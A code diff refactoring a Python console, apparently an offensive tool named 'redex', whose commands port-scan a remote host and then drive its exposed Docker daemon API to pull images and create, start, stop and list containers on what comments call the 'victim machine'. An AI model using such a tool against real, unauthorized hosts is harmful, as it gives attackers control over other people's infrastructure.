@@ -1,11 +1,13 @@
 import json
 import requests
-import socket
 import rich
 
 from dataclasses import dataclass
-from typing import Callable, Optional
+from typing import Callable, Optional, Dict, Any
+
 from redex.network.portscan import PortScanner
+from redex.utils.constants import *
+from redex.network.docker import *
 
 
 @dataclass
@@ -52,7 +54,7 @@ def help_cmd(redex_cls, *args, **kwargs) -> None:
         c.print(cmd_object.__str__())
 
 
-C_HELP = Command("help", "help", "Show all a description of all commands", func=help_cmd)
+C_HELP = Command(C_HELP_NAME, C_HELP_CMD, C_HELP_DESC, func=help_cmd)
 help_cmd.__doc__ = C_HELP.desc
 
 
@@ -61,7 +63,7 @@ def clear_cmd(redex_cls, *args, **kwargs) -> None:
     redex_cls.console.clear()
 
 
-C_CLEAR = Command("clear", "clear", "Clear the Command-Line", func=clear_cmd)
+C_CLEAR = Command(C_CLEAR_NAME, C_CLEAR_CMD,  C_CLEAR_DESC, func=clear_cmd)
 clear_cmd.__doc__ = C_CLEAR.desc
 
 
@@ -71,7 +73,7 @@ def quit_cmd(redex_cls, *args, **kwargs) -> None:
     import sys; sys.exit(0)
 
 
-C_QUIT = Command("quit", "quit", "Quit the application", func=quit_cmd)
+C_QUIT = Command(C_QUIT_NAME,C_QUIT_CMD, C_QUIT_DESC, func=quit_cmd)
 quit_cmd.__doc__ = C_QUIT.desc
 
 ## ------------------------- SET COMMAND ------------------------
@@ -88,11 +90,7 @@ def set_cmd(redex_cls, *args, **kwargs) -> None:
         redex_cls.console.print(f"[*] Setting {variable} => {value}")
 
 
-C_SET = Command(
-    "set", "set VAR=VALUE", 
-    "Set the value of a session variable. To see all possible variables type 'show'",
-    func=set_cmd
-)
+C_SET = Command(C_SET_NAME, C_SET_CMD, C_SET_DESC, func=set_cmd)
 set_cmd.__doc__ = C_SET.desc
 
 ## ------------------------- SETDATA COMMAND ------------------------
@@ -105,11 +103,7 @@ def setdata_cmd(redex_cls, *args, **kwargs) -> None:
         setattr(redex_cls.container_data, attr, data)
 
 
-C_SETDATA = Command(
-    "setdata", "setdata VAR=JSONFILE", 
-    "Set the value of a container data variable with the content of a JSON file",
-    func=setdata_cmd
-)
+C_SETDATA = Command(C_SETDATA_NAME, C_SETDATA_CMD, C_SETDATA_DESC, func=setdata_cmd)
 setdata_cmd.__doc__ = C_SETDATA.desc
 
 ## ------------------------- SHOW COMMAND ------------------------
@@ -130,11 +124,7 @@ def show_cmd(redex_cls, *args, **kwargs) -> None:
         redex_cls.console.print(f"{attr} = {value} (type={type(value)})")
 
 
-C_SHOW = Command(
-    "show", "show [VAR1 ...]",
-    "Show the value of a variable. All if no variable is given",
-    func=show_cmd
-)
+C_SHOW = Command(C_SHOW_NAME,C_SHOW_CMD, C_SHOW_DESC,func=show_cmd)
 show_cmd.__doc__ = C_SHOW.desc
 
 
@@ -152,12 +142,7 @@ def showdata_cmd(redex_cls, *args, **kwargs) -> None:
         redex_cls.console.print(value)
 
 
-C_SHOWDATA = Command(
-    "showdata", "showdata [VAR ...]", 
-    "Shows the content of variable 'VAR' contained in the container data.\n" + \
-    "    If not name is provided, then all variables will be listed.", 
-    func=showdata_cmd
-)
+C_SHOWDATA = Command(C_SHOWDATA_NAME,C_SHOWDATA_CMD, C_SHOWDATA_DESC, func=showdata_cmd)
 showdata_cmd.__doc__ = C_SHOWDATA.desc
 
 
@@ -168,19 +153,14 @@ def scan_cmd(redex_cls, *args, **kwargs) -> None:
     port_scanner.run(remote_host)
 
 
-C_SCAN = Command(
-    "scan", "scan [IP]", 
-    "Scan a specified IP looking for open ports. If no input is provided\n" + \
-    "    it will scan the IP provided in the session varible 'RHOST'.", 
-    func=scan_cmd
-)
+C_SCAN = Command(C_SCAN_NAME,C_SCAN_CMD, C_SCAN_DESC, func=scan_cmd)
 scan_cmd.__doc__ = C_SCAN.desc
 
 ## ------------------------- LSTIMGS COMMAND ------------------------
 def lstimgs_cmd(redex_cls, *args, **kwargs) -> None:
     # Send a GET request to the remote Docker Daemon, in order
     # to obtain all the images actually downloaded on the victim machine.
-    response = requests.get(f"http://{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}/images/json")
+    response = send_request_listimages(redex_cls.session.s_rhost, redex_cls.session.s_rport)
     filter_dictionary = dict()
 
     # Check if the user has also given some filters regardin
@@ -208,40 +188,11 @@ def lstimgs_cmd(redex_cls, *args, **kwargs) -> None:
     redex_cls.console.print(filter_dictionary)
 
 
-C_LSTIMGS = Command(
-    "lstimgs", "lstimgs [filters=[VAL1[:TAG],...]]",
-    "List all images of a remote host, or those that match the filters", 
-    func=lstimgs_cmd
-)
+C_LSTIMGS = Command(C_LSTIMGS_NAME,C_LSTIMGS_CMD, C_LSTIMGS_DESC, func=lstimgs_cmd)
 lstimgs_cmd.__doc__ = C_LSTIMGS.desc
 
 
 ## ------------------------- PULL COMMAND ------------------------
-def socket_connect(sock: socket.socket, rhost: str, rport: int) -> bool:
-    """
-    Try to connect to a remote host via a socket
-
-    Parameters
-    ----------
-    sock : socket.socket
-        The socket used to test the connection towards a remote host
-    rhost : str
-        The IP address of the remote host you would like to connect
-    rport : int
-        The port number through which the connection should be made
-
-    Returns
-    -------
-    bool
-        True if the connection is successfull, False otherwise.
-    """
-    try:
-        sock.connect((rhost, rport))
-        return True
-    except socket.gaierror:
-        return False
-    
-
 def pull_cmd(redex_cls, *args, **kwargs) -> None:
     # Define the name of the image that the user would like to
     # pull on the victim machine. In particular if the tag
@@ -252,59 +203,20 @@ def pull_cmd(redex_cls, *args, **kwargs) -> None:
     else:
         image = redex_cls.session.s_image
 
-    # Create the HTTP request to sent to the Docker Daemon
-    request = f"POST /images/create?fromImage={image} HTTP/1.1\r\n" + \
-              f"Host:{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}\r\n\r\n"    + \
-               "Content-Type: application/json\r\n"
-    
-    encoded_req = request.encode()
-
-    # Setting up the socket that will be used to sent the request
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connected = socket_connect(sock, redex_cls.session.s_rhost, redex_cls.session.s_rport)
-    if not connected: return 
-
-    # Let's send the encoded request and wait until the
-    # entire image has been downloaded into the victim host
-    try:
-        sock.send(encoded_req)
-
-        # Receives the first 4096 bytes of results. They are enough
-        # for what we need to check if the image has been downloaded
-        response = sock.recvmsg(4096)
-        progress = json.loads(response[0].decode().split("\r\n")[10])
-
-        # Let's loop until we finished
-        while "Downloaded" not in progress["status"]:
-            response = sock.recvmsg(4096)
-            progress = json.loads(response[0].decode().split("\r\n")[1])
-
-            if "progress" in progress:
-                redex_cls.console.print(
-                    f"[*] Pulling: [magenta]{progress['progress']}[/magenta]",
-                    end="\r"
-                )
-
-        print("\n")
-    except BrokenPipeError:
-        redex_cls.console.print("[*] Command failed!", style="bold red")
-
-    sock.close()
+    # Send the request
+    send_request_pull_image(
+        redex_cls.session.s_rhost,redex_cls.session.s_rport, image
+    )
 
 
-C_PULL = Command(
-    "pull", "pull [IMAGE[:TAG]]",
-    "Pull a given image on the remote host. If no input image is provided\n" + \
-    "    it will pull the one provided by the value of the session variable 'IMAGE'.",
-    func=pull_cmd
-)
+C_PULL = Command(C_PULL_NAME,C_PULL_CMD, C_PULL_DESC,func=pull_cmd)
 pull_cmd.__doc__ = C_PULL.desc
 
 
 ## ------------------------- CREATE COMMAND ------------------------
 def create_cmd(redex_cls, *args, **kwargs) -> None:
     container_name = redex_cls.session.s_name
-    container_data = redex_cls.container_data
+    container_data = redex_cls.container_data.c_default
 
     # First let's check that the user has provided two inputs
     # In this case the first is the name of the container, while
@@ -327,69 +239,39 @@ def create_cmd(redex_cls, *args, **kwargs) -> None:
     if container_name not in redex_cls.session.s_names:
         redex_cls.session.s_names.append(container_name)
 
-    addr  = f"{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}"
-    query = f"name={container_name}"
-    
-    # Let's create a POST request to create a specified container
-    # The data that the request should contain is in the DATA variable
-    response = requests.post(
-        f"http://{addr}/containers/create?{query}", json=container_data['create']
-    )
-
-    # Check if the response code is 201
-    if response.status_code != 201:
-        redex_cls.console.print(
-            f"[*] [red]Error: {response.json()['message']}[/red]"
-        )
-        raise Exception
-    
-    redex_cls.console.print(
-        f"[*] [green]Container Created[/green] ID: {response.json()['Id']}"
+    send_request_create_container(
+        redex_cls.session.s_rhost, redex_cls.session.s_rport,
+        container_name, container_data
     )
 
 
-C_CREATE_DOC = """Create a container in a remote host. The DATA argument selects the corresponding
-    container data variable that contains the settings of the new container. If
-    no data is provided, it will use the one of the DEFAULT variable. Type
-    'showdata DEFAULT' to see the content of this variable. Also, you can type
-    'showdata' to see the content of all container data variables. The name of
-    the new container will be setted either to the value of the NAME argument,
-    if provided, or to the value of the 'NAME' session variable. If a different
-    name is provided then it will be added to the set of all names. To show the
-    content of the 'NAME' variable type 'show name', otherwise to see all names
-    type 'shownames'.
-"""
-C_CREATE = Command("create", "create [NAME] [DATA=DATA]", C_CREATE_DOC, func=create_cmd)
+C_CREATE = Command(C_CREATE_NAME, C_CREATE_CMD, C_CREATE_DESC, func=create_cmd)
 create_cmd.__doc__ = "\n".join([x.strip() for x in C_CREATE.desc.split("\n")])
 
 
 ## ------------------------- START COMMAND ------------------------
 def start_cmd(redex_cls, *args, **kwagrs) -> None:
-    addr  = f"{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}"
     container_name = redex_cls.session.s_name if len(args) == 0 else args[0]
+
+    # If the container name is not in the list of all names, this means that
+    # the container has not been created yet.
     if not container_name in redex_cls.session.s_names:
         redex_cls.console.print(
             f"[*] Error. Container: {container_name} does not exists", style="bold red"
         )
         return
     
-    response = requests.post(f"http://{addr}/containers/{container_name}/start")
-    if response.status_code != 204:
-        redex_cls.console.print(f"[*] [red]Error: {response.json()['message']}[/red]")
-        raise Exception
+    # Send the request to start the specified container
+    send_request_start_container(
+        redex_cls.session.s_rhost, redex_cls.session.s_rport, container_name
+    )
     
     redex_cls.console.print(
         f"[*] [green]Container {container_name.upper()} Has stated[/green]"
     )
 
 
-C_START = Command(
-    "start", "start [NAME]", 
-    "Start a container with name 'NAME'. If no input name is given\n"   + \
-    "    it will start the one with the default name of the session.\n" + \
-    "    It is possible to see the name with 'show name'.", 
-    func=start_cmd
-)
+C_START = Command(C_START_NAME,C_START_CMD, C_START_DESC, func=start_cmd)
 start_cmd.__doc__ = C_START.desc
 
 
@@ -403,24 +285,65 @@ def stop_cmd(redex_cls, *args, **kwargs) -> None:
         )
         return
     
-    response = requests.post(f"http://{addr}/containers/{container_name}/stop")
-    if response.status_code != 204:
-        redex_cls.console.print(f"[*] [red]Error: {response.json()['message']}[/red]")
-        raise Exception
+    # Send the request to stop the specified container
+    send_request_stop_container(
+        redex_cls.session.s_rhost, redex_cls.session.s_rport, container_name
+    )
     
     redex_cls.console.print(
         f"[*] [green]Container {container_name.upper()} Has been stopped[/green]"
     )
 
 
-C_STOP = Command(
-    "stop", "stop [NAME]", 
-    "Stop a running container named 'NAME'. If not input is provided\n"      + \
-    "    It will stop the container named with the content of the session\n" + \
-    "    'NAME' varible. To see its content, just type 'show name'.", 
-    func=stop_cmd
-)
+C_STOP = Command(C_STOP_NAME,C_STOP_CMD, C_STOP_DESC, func=stop_cmd)
 stop_cmd.__doc__ = C_STOP.desc
+
+
+## ------------------------- LSTCONTS COMMAND ------------------------
+def lstconts_cmd(redex_cls, *args, **kwargs) -> None:
+    # Initialize some variables useful later
+    show_all, filters, args = False, dict(), list(args)
+
+    # In this case the user may would like to see all the containers 
+    if "all" in args:
+        show_all = True
+        args.remove("all")
+
+    maps = {"imgs" : "ancestor", "nets" : "network", "status" : "status"}
+    for user_argument in args:
+        name, filter_val = user_argument.split("=")
+        if name not in maps:
+            redex_cls.console.print(f"[red]No argument with name: {name}[/red]")
+            raise KeyError
+
+        real_name = maps[name]
+        filters[real_name] = filter_val.split(",")
+    
+    params = {"all" : show_all, "filters" : json.dumps(filters)}
+    response = send_request_list_containers(
+        redex_cls.session.s_rhost, redex_cls.session.s_rport, params
+    )
+
+    containers = response.json()
+    if not containers:
+        redex_cls.console.print(f"[*] [yellow]Empty Result[/yellow]")
+        return
+    
+    try:
+
+        containers_content = dict()   
+        for container in containers:
+            infos = extrapolate_information_from_json(container)
+            containers_content[infos["Name"]] = infos
+        
+        redex_cls.console.print(containers_content)
+
+    except KeyError:
+        redex_cls.console.print("[red]Command has failed![/red]")
+
+
+C_LSTCONTS = Command(C_LSTCONTS_NAME,C_LSTCONTS_CMD, C_LSTCONTS_DESC, func=lstconts_cmd)
+lstconts_cmd.__doc__ = C_LSTCONTS.desc
 
 
 
@@ -439,6 +362,7 @@ class RedexCommands(object):
     CREATE   : Command = C_CREATE
     START    : Command = C_START
     STOP     : Command = C_STOP
+    LSTCONTS : Command = C_LSTCONTS
 
     def __getitem__(self, key: str) -> Command:
         """ Returns the corresponding command """
